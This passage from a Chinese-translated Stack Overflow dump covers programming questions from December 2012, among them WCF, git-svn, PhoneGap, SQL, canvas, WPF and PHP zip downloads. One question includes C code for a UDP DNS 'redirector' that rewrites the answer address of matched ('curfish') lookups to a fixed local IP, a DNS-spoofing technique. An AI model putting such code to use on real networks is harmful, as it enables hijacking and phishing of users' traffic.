    public bool IsSSNSerializable = false;

    [DataMember]
    public string Name;
    [DataMember]
    public string phoneNo;

    public string SSN;

    [DataMember(Name = "SSN", EmitDefaultValue = false)]
    public string SSNSerializable
    {
        get
        {
            if (!IsSSNSerializable)
                return null;
            return SSN;
        }
        set
        {
            SSN = value;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:12:21.887

我建议您阅读可能与您的场景匹配[的 WCF 版本控制策略。](http://msdn.microsoft.com/en-us/library/ff384251.aspx)

就我而言，我在数据合同上实现了 IExtensibleDataObject 并在这一层而不是服务合同层进行管理。

不利的一面是难以跟踪不同版本的合同，但是我正在练习半严格的版本控制并且对我来说效果很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T14:31:47.827

如果不同的客户有不同的需求，正确的做法是创建不同的服务。

您将业务逻辑放在共享业务类中（或分布在多个共享业务类中），并针对不同类型的客户端公开不同的服务。这让事情变得美好、抽象和安全，没有人得到他们不需要或不想要的数据。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T14:38:31.820

我第二 Roy，但是如果这是客户端 A 和 B 之间的唯一区别。公开带有参数 IsSSNRequired 的 GetEmployee 方法并没有什么坏处，该参数可以具有默认的 false 值。

# git - 'git svn clone'时保留复制标签的SVN历史

> ID：13916036
> 
> 赞同：0
> 
> 时间：2012-12-17T14:28:51.293
> 
> 标签：git, git-svn

我正在将一些 SVN 项目迁移到 git。

我想将某个标签克隆到它自己的 git 存储库中。

通过在 TAG 路径上执行 git svn clone，我丢失了 svn 副本之前发生的所有历史记录，这些历史记录首先创建了标签。

有没有办法在新的 git 项目中保留原始历史记录？（我可以在我选择的 IDE 中浏览 SVN 历史记录，因此 SVN 似乎能够提供所需的信息）

提醒：我不想要一个带有类似于 SVN 结构的分支和标签的主干项目。我想要一个单独的项目，只带有标签和所有附加的历史记录（包括标签创建之前的修订）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T14:36:27.950

检查`--follow-parent`标志：

```
 git svn clone --follow-parent https://path.to/svnroot/repo/tags/0.12 
```

编辑：

但是请注意，这`git svn`只会看到克隆目录上下文中的内容；svn-tagging 通常涉及将一个目录复制到另一个位置，因此您需要整个目录树（包含“trunk”和最终的“tagX”director）才能有足够的上下文让 git 工作。这样做的原因是，git 将拒绝将任何内容从/复制到 git-repository 本身之外的路径（这是有道理的）。svn 可以查看整个历史记录，因为它确实具有完整的上下文（在服务器上，即使您在本地机器上只有部分结帐）

因此，为了将完整的历史记录保存到您的 git svn clone 中，您可能确实需要克隆整个项目（即至少包含主干和标签目录的目录）。

所以继续的方法是：

*   做一个完整`git svn clone`的 svn 存储库，指定 trunk/tags/branches 目录 (`--trunk`和`--tags`flags`--branches`如果你有一些特殊设置或使用`--stdlayout`如果你的 repo 组织在标准 /trunk、/tags/...、/branches/ ... 方法）

*   这将为您提供一个带有许多 git 分支和 git 标签的 git 存储库，您可以在其中删除所有不需要的分支/标签（或者只是不将它们推送到服务器）

# cordova - 在 PhoneGap 中，一旦下载并安装了应用程序，我们可以更新/覆盖现有的 JSON/图像文件吗？

> ID：13916042
> 
> 赞同：0
> 
> 时间：2012-12-17T14:29:07.677
> 
> 标签：cordova

考虑一个具有离线和在线查看功能的 PhoneGap 画廊项目。

现在离线查看（*当用户没有登录系统时*），我们可以将相关的图像资产和 JSON 文件存储在**www**文件夹中，并根据 JSON 数据显示图库。没关系。

对于在线查看，（*当用户登录系统时*）我们将从服务器加载 JSON，现在根据在线 JSON 数据显示图库。有一个 CMS 模块，可以在其中修改/更新图像及其各自的描述。因此，一旦用户登录，他/她就可以查看最新的画廊。但很快用户注销他/她将看到一个基于旧 JSON 文件的画廊。

补救措施是用最新的 JSON 数据替换现有的 JSON，并用来自服务器的最新图像下载/替换现有图像。对于我之前的一篇文章，[Josemando Sobral](https://stackoverflow.com/a/13832032/1652913)已经指出**www**的内容不能在移动设备上进行部署后更改/更改。所以我的问题（*考虑到 CMS 会经常更新*）是：

1.  对于这种情况，localstorage + database 会是更好的选择吗？随着越来越多的图像或数据被插入到数据库中，数据库大小是否会成为未来的问题？
2.  或者我们应该将所有图像和 JSON 文件放在 www 文件夹之外，在 SD 卡的某个地方，比如说**file:///mnt/sdcard/project_www**？并在那里进行所有文件的下载/替换？

但是由于任何原因，sd 卡不可用或被更改或损坏或数据被擦除，离线查看将无法正常工作。

请在这方面指导我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:16:04.163

听起来您最好将文件放在 SD 卡或内部存储器上的某个位置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-28T13:39:49.917

**您可以在Android/data/X**之间保存和使用文件

 **其中 X 是您的应用程序的标识

[将文件下载到 PhoneGap 应用程序](http://www.raymondcamden.com/index.cfm/2012/1/19/Downloading-files-to-a-PhoneGap-application--Part-1)**

# android - 使用本地 js/css 加载网站

> ID：13916043
> 
> 赞同：0
> 
> 时间：2012-12-17T14:29:11.000
> 
> 标签：android, html, css, android-webview

有没有办法将某人的网站加载到 webview 中，然后将你的 css 应用到它（存储在你的应用程序或其他服务器中）？

我一直在寻找一个月的答案，但似乎没有任何效果，我尝试使用 WebView 中的一些函数来加载和存储网站的 html，然后用我的 url（或一些类似的解决方案）加载它，css已应用，但随后网站 javascripts 不起作用，链接混乱，出现各种问题。（jsoap 也不是答案，尝试过，或者我没有正确理解）

**长话短说，加载 www.some-site.com 但让它使用你的 CSS 并保持完整的功能？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T14:48:58.413

[使用WebViewClient.shouldInterceptRequest](http://developer.android.com/reference/android/webkit/WebViewClient.html#shouldInterceptRequest%28android.webkit.WebView,%20java.lang.String%29)轻松完成。

# c++ - 在 STDOUT 重定向后，CloseHandle 在 Studio 2010 中引发异常

> ID：13916045
> 
> 赞同：1
> 
> 时间：2012-12-17T14:29:14.387
> 
> 标签：c++, exception, redirect, stdout, handle

以下代码在从 Studio 2010 调试器中运行时会导致问题，但在命令行中似乎运行良好（嗯，这是因为异常仅在调试器中引发）：

```
HANDLE hCon = GetStdHandle( STD_OUTPUT_HANDLE );  // Preserve STDOUT
HANDLE hFile = CreateFile( pszOutputFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
// At this point hFile = 0x000000d0
// The file is created and has 0 bytes, as expected

// STDOUT is redirected to our new file handle
SetStdHandle( STD_OUTPUT_HANDLE, hFile );

// Do something here that pumps to STDOUT, output is directed to the file correctly
CloseHandle( hFile );  // EXCEPTION here: 0xC0000008: An invalid handle was specified.
SetStdHandle( STD_OUTPUT_HANDLE, hCon ); 
```

一个简单的 CreateFile/CloseHandle 序列工作正常，我也尝试切换 CloseHandle/SetStdHandle 调用的顺序无济于事，但 GetLastError 确实返回 18 (0x12) ERROR_NO_MORE_FILES “没有更多文件。” 如果 SetStdHandle 确实运行。

带有 STDOUT 重定向的东西失败了，但是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T14:34:38.227

所以，问题似乎是由这个部分引起的，被代码的原作者巧妙地隐藏了：

```
 int fd = _open_osfhandle( (intptr_t)hFile, O_WRONLY | O_TEXT );
   _dup2( fd, 1 );
//   _close( fd ); 
```

这里注释掉的 _close 似乎是导致问题的原因。

# ruby - 使用 Open::URI 显示 HTTP 标头？

> ID：13916046
> 
> 赞同：8
> 
> 时间：2012-12-17T14:29:20.830
> 
> 标签：ruby, curl, open-uri

使用 Open::URI，我可以执行以下操作：

```
require 'open-uri'
#check status
open('http://google.com').status
#get entire html
open('http://google.com').read 
```

是否可以获取请求的 HTTP 标头以便可以调试事物，例如 Curls' `curl -I http://google.com`？

```
$ curl -I google.com
HTTP/1.1 301 Moved Permanently
Location: http://www.google.com/
Content-Type: text/html; charset=UTF-8
Date: Mon, 17 Dec 2012 14:28:17 GMT
Expires: Wed, 16 Jan 2013 14:28:17 GMT
Cache-Control: public, max-age=2592000
Server: gws
Content-Length: 219
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN 
```

这可能吗？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-12-17T14:39:42.267

使用`meta`虚拟文件句柄的方法：

```
open('http://google.com'){|f| pp f.meta  }
{"x-frame-options"=>"SAMEORIGIN",
 "expires"=>"-1",
 "p3p"=>
  "CP=\"This is not a P3P policy! See http://www.google.com/support/accounts/bin/answer.py?hl=en&answer=151657 for more info.\"",
 "content-type"=>"text/html; charset=ISO-8859-1",
 "date"=>"Mon, 17 Dec 2012 14:37:29 GMT",
 "server"=>"gws",
 "x-xss-protection"=>"1; mode=block",
 "set-cookie"=>
  "PREF=ID=d2fb8a93d369bcd2:FF=0:TM=1355755049:LM=1355755049:S=ONVSP6n2jtluFgll; expires=Wed, 17-Dec-2014 14:37:29 GMT; path=/; domain=.google.com, NID=67=OFEvvHCOa3C6wScQCUIKfu_89oL9MSmnFjwN-u5LX_foP8NLsX7G9dq48NLVrf4WUXhqOA1jb38s0e9qeRp1Iwx_LT_N8IuF0Qi6dXVtR2zdvA86INqtfg5uNrKvxJfJ; expires=Tue, 18-Jun-2013 14:37:29 GMT; path=/; domain=.google.com; HttpOnly",
 "cache-control"=>"private, max-age=0",
 "transfer-encoding"=>"chunked"} 
```

[http://www.ruby-doc.org/stdlib-1.9.3/libdoc/open-uri/rdoc/OpenURI/Meta.html](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/open-uri/rdoc/OpenURI/Meta.html)

# android - eclipse，设置android应用程序

> ID：13916048
> 
> 赞同：0
> 
> 时间：2012-12-17T14:29:23.840
> 
> 标签：android, eclipse

我现在正在学习本教程：http: [//www.ibm.com/developerworks/opensource/tutorials/os-eclipse-android/](http://www.ibm.com/developerworks/opensource/tutorials/os-eclipse-android/)

运行代码时出现错误提示“项目包含错误”。但是我在我的项目中没有发现任何错误标记。发生了什么？非常感谢！

![截屏](../Images/8d8ca5c6dc734610226a3e251ac238d8.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T14:34:25.530

右键单击您的项目-属性-Java Build Path-然后您将看到错误，因此您只需删除错误然后清理您的项目

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:40:56.337

在您的目录中有一个 R.java 文件`src`，虽然它在以前的版本中曾经存在（正如我刚刚了解到的那样），但它不再属于那里了。

该文件是由平台而不是您生成的，并且应该出现在`gen`目录中。

您目录中的副本`src`可能会干扰您目录中的真实 R.java 文件`gen`。从中删除文件`src`，Eclipse 会更开心。

# c - pthread 和 UDP

> ID：13916052
> 
> 赞同：0
> 
> 时间：2012-12-17T14:29:38.443
> 
> 标签：c, pthreads

我从 pthread 库开始，我想并行执行几次这样的函数：

```
while(true) {
    //Part A
    //do several stuff
    //End of Part A

    //Part B
    //do other stuffs
    //End of Part B
} 
```

我可以通过 pthread_create() 轻松地做到这一点。问题是主程序似乎在执行 B 部分之前切换线程。结果，我看到 A 部分一遍又一遍地执行，但从未看到 B 部分。有人可以帮忙吗？

一些实际代码 =>

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <netdb.h>
#include <pthread.h>

#define error(msg) \
        perror(msg); \
        exit(EXIT_FAILURE)

//Declarations
int mastersocket;
struct sockaddr_in addr;
struct hostent *fromhost, *tohost;
int nthread=5;
int  decdomain=13;
long serveurdns=0x0101a8c0;

static void * test(void * p_data) {

    while(1) {
        printf("hello\n");
    }
    return NULL;
}

int main(int argc, char **argv) {

        int k, l;
        pthread_t idt[5];

    //Assignation, mallocs
    //Strings

    //Appel a socket
    if( (mastersocket=socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
        error("socket");
    }

    //Configuration de sockaddr pour l'appel a bind
    addr.sin_family=AF_INET;
    addr.sin_addr.s_addr=htonl(INADDR_ANY);
    addr.sin_port=htons(53);

    //Appel a bind
    if( (bind(mastersocket, (struct sockaddr *)&addr, sizeof(addr))) < 0 ) {
        error("bind");
    }

    for(k=0; k<nthread; k++) {

        pthread_create(&idt[k], NULL, mainbis, (void *)mastersocket);

    }
    mainbis((void *)mastersocket);

    return 0;

}

static void * mainbis(void * p_data) {

    int socketh= (int) p_data;
    int found=0, len, cc;
    char *buf, *curfish;
    struct sockaddr_in *from, *to;
    u_long fromaddr, toaddr;
    int lenbuf=5000;

    buf=(char *)malloc(lenbuf);
    curfish=(char *)malloc(100);

    len=sizeof(struct sockaddr_in);
    to=(struct sockaddr_in *)malloc(len);
    from=(struct sockaddr_in *)malloc(len);
    //Structure sockaddr du serveur DNS vers lequel on redirige les requete
    to->sin_family=AF_INET; 
    to->sin_addr.s_addr=serveurdns;
    to->sin_port=htons(53);

    //Let's go
    while(1) {

        found=0;
        curfish=NULL;
        //Reception des requetes
        if((cc=recvfrom(socketh, buf, lenbuf, 0, (struct sockaddr *)from, &len))<0) {
            error("recv");
        }
        buf[cc]='\0';

        //Identification de l'host appelant
        //fromaddr=(*from).sin_addr.s_addr;
        //fromhost=gethostbyaddr((void *)&fromaddr, sizeof(fromaddr), AF_INET);

        //Sortie utilisateur
        printf("\n\n--   New Request From $$ on Port ... Domain = %s ||\n--  ***********************\n", buf+13);

        curfish=somefunction();
        if( curfish!=NULL ) {

            found=1;

        }

        if(sendto(socketh, buf, cc, 0, (struct sockaddr *)to, len)<0) {
            error("send");
        }

        if((cc=recvfrom(socketh, buf, lenbuf, 0, (struct sockaddr *)to, &len))<0) {
            error("recv");
        }
        buf[cc]='\0';

        printf("\n\n--   New Response From $$ on Port ||\n--  ***********************\n");

        if(found) {

            buf[cc-1]=0x81;
            buf[cc-2]=0x2;
            buf[cc-3]=0xa8;
            buf[cc-4]=0xc0;

        }

        if(sendto(socketh, buf, cc, 0, (struct sockaddr *)from, len)<0) {
            error("send");
        }

    }
    return NULL;

} 
```

它是一个用于 DNS 请求的 UDP 重定向器，例如，当我启动并尝试使用 dig 时，我的程序总是输出“New Request ...”字符串，但从不输出“New Response ...”字符串，并且 dig 永远不会得到响应。

朱尔斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:14:53.440

你的代码不能工作。您绑定 1 个套接字`mastersocket`，并使用此套接字创建多个线程。

这本身没问题，但 mainbis() 内部的逻辑假定它将读取对其发送内容的回复。这可能不会发生，您创建的任何其他线程都可以读取回复，这些线程阻塞在`recvfrom`同一个套接字上，并且逻辑分崩离析。

在用于与真实 dns 服务器通信的每个线程中创建一个新套接字，并且仅用于`socketh`与客户端通信。

# spring - Spring Web-Flow PDF 截断长源代码文本

> ID：13916059
> 
> 赞同：0
> 
> 时间：2012-12-17T14:29:58.513
> 
> 标签：spring, pdf, reference, springsource

我发现 spring web flow 参考指南 PDF 正在切断很长的源代码行。我不确定其他春季项目参考 PDF 是否有此问题。[这](http://static.springsource.org/spring-webflow/docs/current/spring-webflow-reference/pdf/spring-webflow-reference.pdf)是有问题的 PDF 的链接。

查看靠近底部的第 7、8 或 9 页，了解问题示例。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T12:09:46.507

[您可以下载html 格式的 spring-webflow-reference（压缩单页），](http://static.springsource.org/spring-webflow/docs/2.3.1.RELEASE/reference/htmlsingle/spring-webflow-reference-single.zip)而不是使用 pdf

# mysql - SQL将具有两个不同值的两个相等的列名合并到一行中

> ID：13916062
> 
> 赞同：0
> 
> 时间：2012-12-17T14:30:21.507
> 
> 标签：mysql, sql, wordpress

我想将具有不同值的两个相等的列名（meta_value）合并为一个行结果而不是两个。

```
SELECT t1.ID, t1.post_content AS product, t2.meta_value AS price
FROM wp_posts AS t1
INNER JOIN wp_postmeta AS t2 ON ( t1.id = t2.post_id ) 
WHERE t1.post_type =  'product'
LIMIT 0 , 30 
```

结果是

```
ID      product      price
1973    product1     12.35
1973    product1     12.10 
```

我希望它看起来像这样

```
ID      product      price      sell
1973    product1     12.35      12.10 
```

price 的 meta_key 是 _price，sell 的 meta_key 是 _sell

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T14:35:38.167

看起来您可以使用带有 case 语句的聚合函数来转换数据

```
SELECT t1.ID, 
   t1.post_content AS product, 
   max(case when meta_key = '_price' then t2.meta_value end) AS price, 
   max(case when meta_key = '_sell' then t2.meta_value end) AS sell
FROM wp_posts AS t1
INNER JOIN wp_postmeta AS t2 ON ( t1.id = t2.post_id ) 
WHERE t1.post_type =  'product'
GROUP BY t1.ID, t1.post_content
LIMIT 0 , 30 
```

但是根据您的表结构并不完全清楚，因此您也可以使用：

```
SELECT t1.ID, 
   t1.post_content AS product, 
   max(t2.meta_value) AS price, 
   min(t2.meta_value) AS sell
FROM wp_posts AS t1
INNER JOIN wp_postmeta AS t2 ON ( t1.id = t2.post_id ) 
WHERE t1.post_type =  'product'
GROUP BY t1.ID, t1.post_content
LIMIT 0 , 30 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T14:37:59.960

```
SELECT
  t1.ID,
  t1.post_content AS product,
  max(case when t2.meta_key='_price' then t2.meta_value end) AS price,
  max(case when t2.meta_key='_sell' then t2.meta_value end) AS sell
FROM wp_posts AS t1
     INNER JOIN wp_postmeta AS t2 ON ( t1.id = t2.post_id )
WHERE t1.post_type =  'product'
GROUP BY t1.ID, t1.post_content
LIMIT 0 , 30 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T14:38:49.710

希望这对你有帮助，

```
SELECT t1.ID, t1.post_content AS product,max(t2.meta_value) as price,min(t2.meta_value) as sell
FROM wp_posts AS t1
INNER JOIN wp_postmeta AS t2 ON ( t1.id = t2.post_id ) 
WHERE t1.post_type =  'product'
LIMIT 0 , 30 
```

# vim - 在 gvim 中进入插入模式时出错

> ID：13916064
> 
> 赞同：-3
> 
> 时间：2012-12-17T14:30:27.613
> 
> 标签：vim, ubuntu

当我在编辑文件时在 gvim 中进入*插入*`.py`模式时，出现以下错误：

```
Error detected while processing function <SNR>99_on_insert_enter:
line    7:
E490: No fold found
Press ENTER or type command to continue 
```

这非常烦人，因为我必须按 esc 并再次进入插入模式，或者按 enter。如何找到导致此错误的脚本？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T01:49:31.940

使用`:scriptnames`并注意以`99:`;开头的行 它会告诉您哪个脚本包含有问题的行。然后，根据脚本和您的 Vim 知识水平，您可以尝试查找并修复问题，或者只是禁用它所属的有问题的插件。

# javascript - 加快在 HTML5 画布元素上绘制许多点

> ID：13916066
> 
> 赞同：12
> 
> 时间：2012-12-17T14:30:45.330
> 
> 标签：javascript, html, canvas, html5-canvas

我需要在 HTML5 画布上绘制很多点，这需要很长时间。我的代码如下所示：

```
var points = getPoints() // Array of {x,y,color}
var ctx = canvas.getContext("2d");

for (var i = 0; i < points.length; i++) {
   ctx.fillStyle = points[i].color
   ctx.beginPath()
   ctx.arc(points[i].x, points[i].y, radius, 0, Math.PI * 2, true)
   ctx.fill() } 
```

我想知道我可以做哪些性能调整来加快速度。我只有5种不同的颜色。例如，我是否会受益于对点列表进行即时排序以`ctx.fillStyle`仅更改 5 次而不是每个点一次？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-17T14:45:35.383

> 例如，我是否会受益于对点列表进行即时排序以仅更改 ctx.fillStyle 5 次而不是每个点一次？

以我的经验，是的——`.fillStyle`经常更换是相当昂贵的。

我有在画布上绘制大量矩形的代码，并且绘制只有两种不经常变化的颜色的矩形的时间明显优于绘制许多经常变化的颜色的时间。

无论如何，因为你只有五种不同的颜色：

1.  创建一个屏幕外画布，您可以在其中绘制五个圆圈
2.  用于`.drawImage()`将正确的色环添加到目标画布中，而无需重新计算弧坐标
3.  分配`points[i]`给循环内的局部变量以避免一遍又一遍地取消引用。

在我的笔记本电脑上，这段代码在 7 毫秒内在 400x400 的画布上绘制了 3000 个圆圈：

```
var colours = ['red', 'green', 'blue', 'yellow', 'magenta'];
var n = colours.length;
var r = 10;
var d = r * 2;

var off = document.createElement('canvas');
off.width = n * d;
off.height = d;
var ctx = off.getContext('2d');  

for (var i = 0; i < n; ++i) {
    ctx.fillStyle = colours[i];
    ctx.beginPath();
    ctx.arc(i * d + r, r, r, 0, 2 * Math.PI);
    ctx.closePath();
    ctx.fill();
}

var canvas = document.getElementById('canvas');
var ctx2 = canvas.getContext('2d');
var t0 = Date.now();
for (var i = 0; i < 3000; ++i) {
    var c = Math.floor(n * Math.random());
    var x = Math.floor(canvas.width * Math.random());
    var y = Math.floor(canvas.height * Math.random());
    ctx2.drawImage(off, c * d, d, d, x - r, y - r, d, d);
}
var t1 = Date.now();
alert((t1 - t0) + "ms"); 
```

​见[http://jsfiddle.net/alnitak/Dpgts/](http://jsfiddle.net/alnitak/Dpgts/)

# c# - WPF 绑定项目控件子控件

> ID：13916077
> 
> 赞同：0
> 
> 时间：2012-12-17T14:31:36.847
> 
> 标签：c#, wpf, xaml

我有一个跨多个页面使用的用户控件，它定义了一个标题标签和两个按钮。我希望控件能够拥有子控件，但是我遇到了绑定这些子控件的问题，因为它们位于 itemscollection 中。当我将绑定添加到 XAML 中的子控件时，它们未注册。

错误输出：`System.Windows.Data Error: 4 : Cannot find source for binding with reference 'ElementName=MyPage'. BindingExpression:Path=MyText; DataItem=null; target element is 'TextBox' (Name=''); target property is 'Text' (type 'String')`

为简洁起见省略了多余的代码。

例如

XAML

```
<UserControl x:Class="MyControl" Name="MyControl">
    <Grid>
        <ItemsControl Name="ItemsControl" ItemsSource="{Binding ItemsSource, ElementName=MyControl}" />
    </Grid>
</UserControl> 
```

代码背后

```
[ContentProperty("Items")]
public partial class MyControl : UserControl
{
    public static readonly DependencyProperty ItemsSourceProperty =
            ItemsControl.ItemsSourceProperty.AddOwner(typeof (MyControl));

    public IEnumerable ItemsSource
    {
        get { return (IEnumerable) GetValue(ItemsSourceProperty); }
        set { SetValue(ItemsSourceProperty, value); }
    }

    public ItemCollection Items
    {
        get { return ItemsControl.Items; }
    }
} 
```

用法：

```
<Page x:Class="MyPage" Name="MyPage">
    <MyControl>
        <TextBox Text="{Binding MyText,
                        ElementName=MyPage,
                        UpdateSourceTrigger=PropertyChanged}" />
    </MyControl>
</Page> 
```

代码背后

```
public partial class MyPage : Page, INotifyPropertyChanged
{
    private string _myText;
    public string MyText
    {
        get{ return _myText; }
        set
        {
            _myText = value;
            OnPropertyChanged("MyText");
        }
    }
} 
```

我希望能够将 TextBox 数据绑定到`MyText`属性，以便每当我在后面的代码中修改它时，它都会在页面上得到更新。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:36:40.380

将我的评论转换为答案：

删除`ElementName`并尝试`RelativeSource={RelativeSource FindAncestor, AncestorType=Page}`

# html - 向左浮动在右侧提供不需要的填充

> ID：13916078
> 
> 赞同：-1
> 
> 时间：2012-12-17T14:31:44.773
> 
> 标签：html, css

你好，每次我在那个页面的某个地方使用一个浮点数时，我都会在右边得到一个奇怪的填充。使用普通浏览器还可以，但是在 iPad 上查看有点难看，因为我在右侧得到了 1 厘米左右的填充物。有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T14:36:46.187

对于 ipad 特定的 CSS

```
 @media only screen and (device-width: 768px) {
         /* For general iPad layouts */
                }

    @media only screen and (min-device-width: 481px) and (max-device-width: 1024px)   and (orientation:portrait) {
         /* For portrait layouts only */
          }

       @media only screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape) {
       /* For landscape layouts only */
          } 
```

编辑 ：

```
 <!--Target iPad-->
     <link href="ipad.css" rel="stylesheet" media="only screen and (min-device-width: 768px) and (max-device-width: 1024px)" type="text/css" />
    <!--Target iPhone 3GS> -->
    <link href="iphone.css" rel="stylesheet" media="only screen and  (max-device-width: 480px)" type="text/css" />
     <!--Target iPhone 4-->
     <link href="retnia.css" rel="stylesheet" media="only screen and (-webkit-min-device-pixel-ratio: 2) and (max-device-width: 480px)" type="text/css" /> 
```

jQuery

```
 if(navigator.platform == 'iPad' || navigator.platform == 'iPhone' || navigator.platform == 'iPod')
   {
    $(window).scroll(function() {
    $('header').css('top', $(this).scrollTop());
    });

   }; 
```

并将您的特殊 css 文件用于您的 ipad，当您将其定位为 IPAD 时，在上面的代码中您的文件将是“ipad.css”

# android - Android pdf 视图重定向

> ID：13916082
> 
> 赞同：0
> 
> 时间：2012-12-17T14:31:52.387
> 
> 标签：android, pdf, viewer

我有以下代码可以从远程查看器中提取 pdf 文档以进行查看：

```
package com.example.techvault;

import java.io.File;
import java.io.IOException;
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

public class PDFFromServerActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_document);
        Intent in= getIntent(); // gets the previously created intent
        String url = in.getStringExtra("full_url");
        if (!url.startsWith("http://") && !url.startsWith("https://")){
            url = "http://ezdrawdocs.com" + url;
        }
        Log.d("pdf url: ",url);
        String extStorageDirectory = Environment.getExternalStorageDirectory()
        .toString();
        File folder = new File(extStorageDirectory, "pdf");
        folder.mkdir();
        File file = new File(folder, "Read.pdf");
        try {
            file.createNewFile();
        } catch (IOException e1) {
            e1.printStackTrace();
        }

        Downloader.DownloadFile(url, file);

        showPdf();
    }
    public void showPdf()
        {
            File file = new File(Environment.getExternalStorageDirectory()+"/pdf/Read.pdf");
            PackageManager packageManager = getPackageManager();
            Intent testIntent = new Intent(Intent.ACTION_VIEW);
            testIntent.setType("application/pdf");
            List list = packageManager.queryIntentActivities(testIntent, PackageManager.MATCH_DEFAULT_ONLY);
            Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            Uri uri = Uri.fromFile(file);
            intent.setDataAndType(uri, "application/pdf");
            startActivity(intent);
        }
} 
```

选择后退箭头时，它会重定向到空白屏幕。选择后退箭头时，如何控制要重定向到的活动？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T17:05:00.153

您在这里所做的是实现我所说的“直通活动”（没有 UI 并立即启动不同活动的活动）......我个人尽量避免它们。

也就是说，您需要做的是在in`Activity.finish()`之后调用。这将关闭您的直通，这样当您退出 PDF 查看器时，您将不会返回直通。`showPDF()``Activity.onCreate()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T14:35:42.360

您可以在活动下的清单中定义它

```
<meta-data
    android:name="android.support.PARENT_ACTIVITY"
    android:value="com.example.yourapp.SomeActivity" /> 
```

# php - 如何使用标头php下载zip文件而不将其保存在服务器上

> ID：13916084
> 
> 赞同：7
> 
> 时间：2012-12-17T14:31:56.947
> 
> 标签：php, zip

我有这个代码

```
<?php
$files = array('includes/s.xlsx', 'includes/test.html');
$zipname = 'file.zip';
$zip = new ZipArchive;
$zip->open($zipname, ZipArchive::CREATE);
foreach ($files as $file) {
  $zip->addFile($file);
 }
$zip->close();

header('Content-Type: application/zip');
header('Content-disposition: attachment; filename=filename.zip');
header('Content-Length: ' . filesize($zipname));
readfile($zipname); 
```

但我不想将 zip 文件保存到服务器，我只想将它提供给用户。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-17T14:37:59.523

ZIP 不是一种可流式格式（目标需要支持查找，即不能将 ZIP 文件简单地写入到无法重新读取和修改先前写入的数据的目标）您尝试做的事情是行不通的。因此，最好的解决方案（如果您的 zip 文件不会很大）是在临时位置创建它`readfile()`，然后删除临时文件。

请参阅以下 Stack Overflow 问题以供进一步参考。它们包含一些可能适合您的解决方法：

*   [PHP中的压缩流](https://stackoverflow.com/questions/3078266/zip-stream-in-php)
*   [LAMP：如何即时为用户创建大文件的 .Zip，而不会出现磁盘/CPU 抖动](https://stackoverflow.com/questions/4357073/on-the-fly-zipping-streaming-of-large-files-in-php-or-otherwise/4357904#4357904)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-01-24T14:21:09.087

尝试在之后添加`readfile($zipname);`：

```
// delete the file from the server
unlink($zipname);
exit; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-17T14:40:39.377

您正在使用该对象`$zip`打开和修改 zip 文件，但`filesize()`仅`readfile()`适用于文件名，因此您应该拥有以下内容：

```
header('Content-Length: ' . filesize($zipname));
readfile($zipname); 
```

顺便说一句，您可以使用`tempnam()`生成一个“临时”文件来保存 zip 内容；一旦`readfile()`完成，你仍然必须这样做`unlink()`。

# java - Jackson - 递归解析成 Map

> ID：13916086
> 
> 赞同：13
> 
> 时间：2012-12-17T14:32:08.407
> 
> 标签：java, json, parsing, jackson

我正在尝试简化我的代码：我想存储键和值（所有字符串）。

我实际上正在使用 a`Map<String, Object>`来存储它。hat way`Object`可以是一个值 ( `String`) 或一个新节点 ( `Map<String, Object>`)。

我怎样才能简化这段代码？递归函数会很好。

```
try {
    JsonParser jsonParser = new JsonFactory().createJsonParser(content);

    jsonParser.nextToken();
    while (jsonParser.nextToken() != JsonToken.END_OBJECT) {
        jsonParser.nextToken();

        if (jsonParser.getCurrentToken() == JsonToken.START_OBJECT) {
            while (jsonParser.nextToken() != JsonToken.END_OBJECT) {
                String key = jsonParser.getCurrentName();
                jsonParser.nextToken();

                if (jsonParser.getCurrentToken() == JsonToken.START_OBJECT) {
                    mData.put(key, new HashMap<String, Object>());
                    while (jsonParser.nextToken() != JsonToken.END_OBJECT) {
                        String subkey = jsonParser.getCurrentName();
                        jsonParser.nextToken();

                        if (jsonParser.getCurrentToken() == JsonToken.START_OBJECT) {
                            Map<String, Object> subdata = (Map<String, Object>) mData.get(key);
